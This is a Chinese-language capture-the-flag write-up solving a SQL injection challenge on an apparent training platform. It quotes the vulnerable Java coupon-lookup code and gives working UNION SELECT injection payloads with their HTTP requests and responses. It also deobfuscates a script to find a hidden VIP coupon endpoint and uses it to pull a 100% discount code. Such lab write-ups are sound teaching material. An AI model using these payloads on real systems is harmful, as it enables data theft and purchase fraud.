#  SQL Injection Challenge 5(SQL 注入 5)

## 题介绍
需要免费购买第三个商品，提示是优惠券有问题 

## 功能实现 
请求时首先发送   
```
POST /challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62CouponCheck HTTP/1.1

couponCode=5
```
存在一个SQL注入   
```

String couponCode = request.getParameter("couponCode");  //接收参数 
log.debug("couponCode - " + couponCode);
if (couponCode == null || couponCode.isEmpty())
	couponCode = new String();

htmlOutput = new String("");
Connection conn = Database.getChallengeConnection(applicationRoot, "SqlInjectionChallenge5ShopCoupon");
log.debug("Looking for Coupons Insecurely");
PreparedStatement prepstmt = conn.prepareStatement("SELECT itemId, perCentOff, itemName FROM coupons JOIN items USING (itemId) WHERE couponCode = '" + couponCode + "';"); // 获得哪个商品 多少降价信息 
ResultSet coupons = prepstmt.executeQuery();
try
{
	if(coupons.next())
	{
		htmlOutput = new String("Valid Coupon for ");
		log.debug("Found coupon for %" + coupons.getInt(2));
		log.debug("For Item Name " + coupons.getString(3));
		htmlOutput += "" + bundle.getString("response.percent")+ "" + coupons.getInt(2) + " " + bundle.getString("response.off")+ " " + Encode.forHtml(coupons.getString(3)) + " " + bundle.getString("response.items")+ "";
	}
	else
	{
		htmlOutput = "" + bundle.getString("response.noCoupon")+ "";
	}
}
```

提交参数  
```
couponCode=5' or '1'='1
```

返回内容  Troll 将10% 
```
Valid Coupon for %10 off Troll items
```

购买商品请求  
```
POST /challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62 HTTP/1.1


megustaAmount=4&trollAmount=3&rageAmount=1&notBadAmount=2&couponCode=5
```

对应代码   
```
try
{
	int megustaAmount = validateAmount(Integer.parseInt(request.getParameter("megustaAmount")));  //参数过滤  0~9000
	log.debug("megustaAmount - " + megustaAmount);
	int trollAmount = validateAmount(Integer.parseInt(request.getParameter("trollAmount")));  //参数过滤  0~9000
	log.debug("trollAmount - " + trollAmount);
	int rageAmount = validateAmount(Integer.parseInt(request.getParameter("rageAmount")));  //参数过滤  0~9000
	log.debug("rageAmount - " + rageAmount);
	int notBadAmount = validateAmount(Integer.parseInt(request.getParameter("notBadAmount")));  //参数过滤  0~9000
	log.debug("notBadAmount - " + notBadAmount);
	String couponCode = request.getParameter("couponCode");
	log.debug("couponCode - " + couponCode);
	
	//Working out costs
	int megustaCost = megustaAmount * 30;
	int trollCost = trollAmount * 3000;
	int rageCost = rageAmount * 45;
	int notBadCost = notBadAmount * 15;
	int perCentOffMegusta = 0; // Will search for coupons in DB and update this int
	int perCentOffTroll = 0; // Will search for coupons in DB and update this int
	int perCentOffRage = 0; // Will search for coupons in DB and update this int
	int perCentOffNotBad = 0; // Will search for coupons in DB and update this int
	
	htmlOutput = new String();
	Connection conn = Database.getChallengeConnection(applicationRoot, "SqlInjectionChallenge5Shop");
	log.debug("Looking for Coupons");
	PreparedStatement prepstmt = conn.prepareStatement("SELECT itemId, perCentOff FROM coupons WHERE couponCode = ?"
			+ "UNION SELECT itemId, perCentOff FROM vipCoupons WHERE couponCode = ?");  //查询优惠码 
	prepstmt.setString(1, couponCode);
	prepstmt.setString(2, couponCode);
	ResultSet coupons = prepstmt.executeQuery();
	try
	{
		if(coupons.next())
		{
			if(coupons.getInt(1) == 1) // MeGusta
			{
				log.debug("Found coupon for %" + coupons.getInt(2) + " off MeGusta");
				perCentOffMegusta = coupons.getInt(2);
			}
			else if (coupons.getInt(1) == 2) // Troll
			{
				log.debug("Found coupon for %" + coupons.getInt(2) + " off Troll");
				perCentOffTroll = coupons.getInt(2);
			}
			else if (coupons.getInt(1) == 3) // Rage
			{
				log.debug("Found coupon for %" + coupons.getInt(2) + " off Rage");
				perCentOffRage = coupons.getInt(2);
			}
			else if (coupons.getInt(1) == 4) // NotBad
			{
				log.debug("Found coupon for %" + coupons.getInt(2) + " off NotBad");
				perCentOffNotBad = coupons.getInt(2);
			}
			
		}
	}
	catch(Exception e)
	{
		log.debug("Could Not Find Coupon: " + e.toString());
	}
	conn.close();
	
	//Work Out Final Cost
	megustaCost = megustaCost - (megustaCost * (perCentOffMegusta/100));
	rageCost = rageCost - (rageCost * (perCentOffRage/100));
	notBadCost = notBadCost - (notBadCost * (perCentOffNotBad/100));
	trollCost = trollCost - (trollCost * (perCentOffTroll/100)); //结果为 0 即可 
	int finalCost = megustaCost + rageCost + notBadCost + trollCost;
	
	//Output Order
	htmlOutput = "<h3>" + bundle.getString("response.orderComplete")+ "</h3>"
			+ "" + bundle.getString("response.orderComplete.p1")+ "<br/><br/>"
			+ "" + bundle.getString("response.orderComplete.p2")+ "<a><strong>$" + finalCost + "</strong></a>";
	if (trollAmount > 0 && trollCost == 0)
	{
		htmlOutput += "<br><br>" + bundle.getString("response.trollsFreeSolution")+ "<a><b>" + Encode.forHtml(levelSolution) + "</b></a>";
	}
}
catch(Exception e)
{
	log.debug("Didn't complete order: " + e.toString());
	htmlOutput += "<p>" + bundle.getString("response.orderFailed")+ "</p>";
}

private static int validateAmount (int amount)
	{
		if(amount < 0 || amount > 9000)
			amount = 0;
		return amount;
	}
```
从题可以看出，要保证 巨魔 商品的最终价格为 0 即可  
perCentOffTroll 来源于sql查询结果 ，需要获得对应的商品信息  

## 解题步骤  

发现 这个注入点   
```
POST /challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62CouponCheck HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 110


couponCode=1' union select itemId,percentOff,CONCAT('This is the couponCode: ', itemId, ' ') from coupons; -- 
```

返回内容  
```
Valid Coupon for %100 off This is the couponCode: 3  items
```

itemId = 3 对巨魔商品计算没有影响   

```
//发送请求  
couponCode=1' union select itemId,percentOff,CONCAT('This is the couponCode: ', couponCode, ' ') from coupons where itemId=2; -- 

//获得返回内容 
Valid Coupon for %10 off This is the couponCode: PleaseTakeATroll  items

//返佣比较少  无法达到预期 

//发送请求 
couponCode=1' union select itemId,percentOff,CONCAT('This is the couponCode: ', couponCode, ' ') from coupons where itemId=2 and percentOff  != 10; -- 

//获得返回内容 
Valid Coupon for %50 off This is the couponCode: HalfOffTroll  items

最高返佣是50% 无法达到预期 
```


查看提示   
发现需要研究 这个js  
```
challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62/couponCheck.js

第一行解密  
var _0xffee = ["change", "val", "#couponCode", "POST", "8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62CouponCheck", "ajax", "8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck", "#vipCouponCode"];

$(_0xffee[7])[_0xffee[0]](function() {
	var _0xe83dx1 = $(_0xffee[2])[_0xffee[1]]();
	var _0xe83dx2 = $[_0xffee[5]]({
		type: _0xffee[3],
		url: _0xffee[6],
		data: {
			couponCode: _0xe83dx1
		},
		async: false
	});
})[_0xffee[0]]();

可知还有个请求地址  _0xffee[6]( 8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck)


这个地址  
8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck  与 8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62CouponCheck 参数相同  

同样存在注入  

请求  

POST /challenges/8edf0a8ed891e6fef1b650935a6c46b03379a0eebab36afcd1d9076f65d4ce62VipCouponCheck HTTP/1.1


couponCode=6' union select itemId,percentOff,CONCAT('This is the couponCode: ', couponCode, ' ') from vipCoupons where itemId=2; -- 

获得返回  
Valid Coupon for %100 off This is the couponCode: spcil/|Pse3cr3etCouponStu.f4rU176  items

couponCode 为 spcil/|Pse3cr3etCouponStu.f4rU176 ，优惠100% 
```
## 总结  

复杂的业务流程，很容易导致安全问题，需要每个点都做的很好才可以  